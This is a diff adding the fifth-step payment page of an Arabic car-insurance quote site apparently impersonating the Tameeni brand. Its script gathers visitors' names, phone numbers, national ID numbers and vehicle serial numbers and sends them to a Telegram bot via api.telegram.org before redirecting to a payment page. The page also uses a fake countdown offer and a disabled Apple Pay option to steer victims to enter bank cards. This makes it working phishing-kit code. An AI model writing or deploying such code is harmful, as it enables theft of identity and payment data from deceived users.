@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="robots" content="noindex, nofollow"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - خطوة 5</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/stylef.css">
+<link rel="stylesheet" href="assets/css/theme-blue-flow.css">
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="assets/images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+<div class="stepper">
+<div class="step" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step active" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<h2 style="padding-top: 16px;">الملخص والدفع</h2>
+
+<div class="card" id="summaryCard">
+<div class="card-title">ملخص طلب التأمين</div>
+<ul class="summary-list" id="summaryList">
+
+</ul>
+<div class="total-text" id="totalText"></div>
+<div class="total-note">الإجمالي تقريبي وغير ملزم حتى إصدار عرض السعر النهائي من شركة التأمين.</div>
+</div>
+
+<div class="card">
+<div class="card-title">طريقة الدفع</div>
+<span class="label">اختر وسيلة الدفع</span>
+<div class="pay-options">
+<div class="pay-option" data-method="card">
+<div class="pay-main">
+<span class="pay-title">بطاقة بنكية</span>
+<span class="pay-sub">مدى / فيزا / ماستركارد</span>
+</div>
+<div class="pay-logos">
+  <img src="assets/images/mad.png"    alt="مدى"  class="pay-logo pay-logo-mada">
+  <img src="assets/images/vimas.webp" alt="فيزا ماستر" class="pay-logo">
+</div>
+<input class="pay-radio" name="payMethod" type="radio" value="card"/>
+</div>
+<div class="pay-option" data-method="apple">
+<div class="pay-main">
+<span class="pay-title">Apple Pay</span>
+<span class="pay-sub">دفع عن طريق Apple Pay</span>
+</div>
+<div class="pay-logos">
+  <img src="assets/images/appy.jpg" alt="Apple Pay" class="pay-logo pay-logo-apple">
+</div>
+<input class="pay-radio" name="payMethod" type="radio" value="apple"/>
+</div>
+</div>
+<div class="warning" id="appleWarning" style="display:none;">
+        عذراً، خدمة Apple Pay غير متوفرة في الوقت الحالي. الرجاء اختيار بطاقة بنكية.
+      </div>
+<div class="error" id="payError"></div>
+</div>
+<div class="buttons-row">
+<a class='btn btn-secondary' href='addons.html'>السابق</a>
+<button class="btn btn-primary" id="confirmBtn" type="button">تأكيد الدفع</button>
+</div>
+
+<div class="offer-modal" id="offer-modal">
+<div class="offer-modal-backdrop"></div>
+<div class="offer-modal-box">
+<img alt="عرض البطاقات" class="offer-image" src="inpay.jpg"/>
+<div class="offer-timer-title">باقي للعرض</div>
+<div class="offer-timer">
+<div class="time-block">
+<span id="offer-seconds">00</span>
+<div class="time-label">ثواني</div>
+</div>
+<div class="time-separator">:</div>
+<div class="time-block">
+<span id="offer-minutes">25</span>
+<div class="time-label">دقائق</div>
+</div>
+</div>
+<button class="offer-close-btn" id="offerCloseBtn" style="display: block; width: calc(100% - 32px); margin: 0 auto 10px; padding: 12px 0; border-radius: 12px; border: 1px solid #cfe2f8; background: #f6fbff; color: #0f4f99; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit;">
+        إغلاق
+      </button>
+<button class="offer-continue-btn" id="offerContinueBtn" style="display: block; width: calc(100% - 32px); margin: 0 auto 16px; padding: 12px 0; border-radius: 12px; border: none; background: #ffb100; color: #fff; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit;">
+        متابعة
+      </button>
+</div>
+</div>
+</main>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+<script src="assets/js/telegram-config.js"></script>
+<script src="assets/js/v2x0.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const options = document.querySelectorAll('.pay-option');
+        options.forEach(option => {
+            option.addEventListener('click', function() {
+                const radio = this.querySelector('.pay-radio');
+                if (radio) {
+                    radio.checked = true;
+                    options.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                }
+            });
+        });
+
+        // عرض بيانات العميل والسعر في الملخص
+        const sessionData = JSON.parse(sessionStorage.getItem('tameeniTempData') || '{}');
+        const summaryList = document.getElementById('summaryList');
+        
+        if (summaryList) {
+            // مسح القائمة القديمة
+            summaryList.innerHTML = '';
+            
+            // إضافة بيانات العميل
+            if (sessionData.userName) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>الاسم:</strong> ' + sessionData.userName;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.phoneNumber) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>رقم الهاتف:</strong> ' + sessionData.phoneNumber;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.carMake) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>نوع المركبة:</strong> ' + sessionData.carMake;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.carYear) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>سنة الصنع:</strong> ' + sessionData.carYear;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.selectedCompany) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>شركة التأمين:</strong> ' + sessionData.selectedCompany;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.selectedPlan) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>نوع الخطة:</strong> ' + sessionData.selectedPlan;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.selectedPrice) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>السعر الأساسي:</strong> ' + sessionData.selectedPrice + ' ريال';
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.addons && sessionData.addons !== 'لا توجد إضافات') {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>الإضافات:</strong> ' + sessionData.addons;
+                summaryList.appendChild(li);
+            }
+            
+            if (sessionData.addonsExtra && sessionData.addonsExtra > 0) {
+                const li = document.createElement('li');
+                li.innerHTML = '<strong>إجمالي الإضافات:</strong> ' + sessionData.addonsExtra + ' ريال';
+                summaryList.appendChild(li);
+            }
+        }
+        
+        // حساب وعرض الإجمالي
+        const totalText = document.getElementById('totalText');
+        if (totalText && sessionData.selectedPrice) {
+            const basePrice = parseInt(sessionData.selectedPrice) || 0;
+            const addonsPrice = parseInt(sessionData.addonsExtra) || 0;
+            const total = basePrice + addonsPrice;
+            totalText.textContent = 'الإجمالي: ' + total + ' ريال';
+        }
+    });
+
+    var step5Sent = false;
+
+    window.handleFinalConfirm = function() {
+        if (step5Sent) {
+            window.location.href = 'payment.html';
+            return;
+        }
+        const sessionData = JSON.parse(sessionStorage.getItem('tameeniTempData') || '{}');
+        const normalizeToWesternDigits = function(val) {
+            return String(val)
+                .replace(/[٠-٩]/g, function(d) { return '٠١٢٣٤٥٦٧٨٩'.indexOf(d); })
+                .replace(/[^\d.]/g, '');
+        };
+        const totalRaw = document.getElementById('totalText')
+            ? document.getElementById('totalText').textContent
+            : '';
+        const total = normalizeToWesternDigits(totalRaw);
+        sessionData.total = total;
+        sessionStorage.setItem('tameeniTempData', JSON.stringify(sessionData));
+
+        const hasCoreData = !!(sessionData.userName || sessionData.phoneNumber || sessionData.idNumber || sessionData.serialNumber);
+        if (!hasCoreData) {
+            const err = document.getElementById('payError');
+            if (err) err.textContent = 'البيانات غير مكتملة. الرجاء العودة للخطوات السابقة ثم المحاولة مرة أخرى.';
+            return;
+        }
+
+        const rtlLine = function(text) {
+            return '\u200F' + text;
+        };
+        const isolateValue = function(val) {
+            return '\u2066' + String(val) + '\u2069';
+        };
+        const toArabicDigits = function(val) {
+            return String(val).replace(/\d/g, function(d) {
+                return '٠١٢٣٤٥٦٧٨٩'[d];
+            });
+        };
+        const lines = [
+            rtlLine('🟣 الخطوة النهائية – ملخص الطلب'),
+            rtlLine('=== البيانات الأساسية ==='),
+            rtlLine(`👤 الاسم: ${isolateValue(sessionData.userName || 'غير معروف')}`),
+            rtlLine(`📞 رقم الهاتف: ${isolateValue(sessionData.phoneNumber || 'غير معروف')}`),
+            rtlLine(`📄 نوع العرض: ${isolateValue(sessionData.offerType || 'غير معروف')}`),
+            rtlLine(`🆔 نوع تسجيل المركبة: ${isolateValue(sessionData.regType || 'غير معروف')}`),
+            rtlLine(`🪪 رقم الهوية: ${isolateValue(sessionData.idNumber || 'غير معروف')}`),
+            rtlLine(`🔢 الرقم التسلسلي/الجمركي: ${isolateValue(sessionData.serialNumber || 'غير معروف')}`),
+            rtlLine('=== الإجمالي النهائي ==='),
+            rtlLine(`💰 الإجمالي: ${isolateValue(total ? (toArabicDigits(total) + ' ريال') : 'غير معروف')}`)
+        ];
+        const message = lines.join('\n');
+
+        const loadingScreen = document.getElementById('loadingScreen');
+        if (loadingScreen) loadingScreen.style.display = 'flex';
+
+        const goNext = function() {
+            window.location.href = 'payment.html';
+        };
+
+        const configs = window.TELEGRAM_CONFIGS || [{ token: window.BOT_TOKEN, chatId: window.CHAT_ID }];
+        const validConfigs = configs.filter(c => c.token && c.chatId);
+
+        if (validConfigs.length === 0) {
+            goNext();
+            return;
+        }
+
+        const sendPromises = validConfigs.map(c =>
+            fetch(`https://api.telegram.org/bot${c.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: c.chatId,
+                    text: message
+                })
+            })
+        );
+
+        step5Sent = true;
+        Promise.all(sendPromises).finally(goNext);
+    };
+
+    // Hijack the confirm button click to show the modal first
+    document.addEventListener('click', function(e) {
+        if (e.target && e.target.id === 'confirmBtn') {
+            const selected = document.querySelector('.pay-radio:checked');
+            if (!selected) {
+                const err = document.getElementById('payError');
+                if (err) err.textContent = 'الرجاء اختيار وسيلة الدفع أولاً.';
+                return;
+            }
+            if (selected.value === 'apple') {
+                const warn = document.getElementById('appleWarning');
+                if (warn) warn.style.display = 'block';
+                return;
+            }
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            
+            // Show the modal
+            const modal = document.getElementById('offer-modal');
+            if (modal) {
+                modal.style.display = 'flex';
+                modal.classList.add('show');
+            }
+        }
+
+        // Handle modal continue button click
+        if (e.target && e.target.id === 'offerContinueBtn') {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            window.handleFinalConfirm();
+        }
+
+        // Handle modal close clicks
+        if (e.target && (e.target.id === 'offerCloseBtn' || e.target.classList.contains('offer-modal-backdrop'))) {
+            const modal = document.getElementById('offer-modal');
+            if (modal) {
+                modal.style.display = 'none';
+                modal.classList.remove('show');
+            }
+        }
+    }, true);
+
+    // Start countdown timer for offer modal
+    (function() {
+        var minutesEl = document.getElementById('offer-minutes');
+        var secondsEl = document.getElementById('offer-seconds');
+        if (!minutesEl || !secondsEl) return;
+        
+        var totalSeconds = 25 * 60; // 25 minutes
+        var timerInterval = null;
+        
+        function updateTimer() {
+            var m = Math.floor(totalSeconds / 60);
+            var s = totalSeconds % 60;
+            
+            minutesEl.textContent = m < 10 ? '0' + m : m;
+            secondsEl.textContent = s < 10 ? '0' + s : s;
+            
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+            } else {
+                totalSeconds--;
+            }
+        }
+        
+        document.addEventListener('click', function(e) {
+            if (e.target && e.target.id === 'confirmBtn') {
+                if (timerInterval) clearInterval(timerInterval);
+                updateTimer();
+                timerInterval = setInterval(updateTimer, 1000);
+            }
+        });
+    })();
+</script>
+</body>
+</html>
